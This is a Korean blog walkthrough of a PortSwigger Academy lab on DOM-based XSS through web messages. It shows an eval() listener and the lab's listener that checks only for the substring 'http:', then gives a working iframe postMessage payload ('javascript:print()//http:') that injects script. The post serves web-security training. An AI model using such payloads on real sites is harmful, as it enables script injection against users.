---
layout: post
title: "Burp Academy-Dom 관련 취약점: DOM XSS using web messages"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Dom 관련 취약점, XSS]
toc: true
last_modified_at: 2024-10-29 09:33:00 +0900
---

# 개요
- Dom based 타입의 XSS 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url
- Dom 취약점 중에서 웹메세지 설명페이지: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
- 난이도: PRACTITIONER (보통)


# 문제 
- 이 랩에는 웹 메시지를 통한 DOM-based 리다이렉션 취약점이 있다. 
- exploit 서버에서 HTML페이지를 만들어서 print함수가 호출되도록 하면 문제가 풀린다. 

```
This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.
```


# Web Message를 통한 XSS 기본 지식
어떤 웹 사이트에 다음과 같은 코드가 있다고 하자. 

```js
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

위 코드는 취약하다. 왜냐하면 공격자가 다음 iframe을 victim에게 실행시키면 Javascript코드 삽입이 가능하기 때문이다. 

```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

웹 사이트의 이벤트 리스너가 메세지의 오리진을 체크하지 않고, 공격자의 postMessage() 메서드의 targetOrigin이 *를 지정하고 있으므로, 이벤트 리스너는 페이로드를 수락하고 이를 싱크(eval함수)로 전달하기 때문에 코드 인젝션이 가능해진다. 

# 풀이 
그러면 위의 지식을 가지고 문제를 풀어보자. 

## 웹 메세지 취약점이 있는 곳 찾기 
문제 서버의 / 경로의 HTML페이지를 분석해보면 다음과 같은 코드가 있다. 웹 메세지로 보낸 데이터에 문자열 'http:'나 'https:'가 존재하면 location.href에 웹 메시지 데이터를 전달해주고 있다. 

좀 살펴보면 이 체크 코드는 위험한 것을 알 수 있다. 단순히  'http:'나 'https:'가 포함되어 있는지만 보고 있기 때문에 웹 메세지 데이터의 뒤에 있어도 체크를 통과할 수 있게 된다! 

```js
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

## exploit코드 만들기 & 테스트 
 
exploit 서버에서 다음과 같이 페이로드를 만든다. `javascript:print()//http:`에는 'http:' 문자열이 포함되어 있으므로 자바스크립트의 체크를 통과한다. 

```html
<iframe src="https://0a2300bb0357c7b8805530b4004300e6.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

저장한 후에 View exploit을 선택하면 다음과 같이 페이로드가 작동하는 것을 알 수 있다. 

![](/images/burp-academy-dom-based-2-1.png)

Deliver exploit to victim 버튼을 클릭하면 다음과 같이 랩이 풀렸다는 메세지가 표시된다. 

![](/images/burp-academy-dom-based-2-success.png)
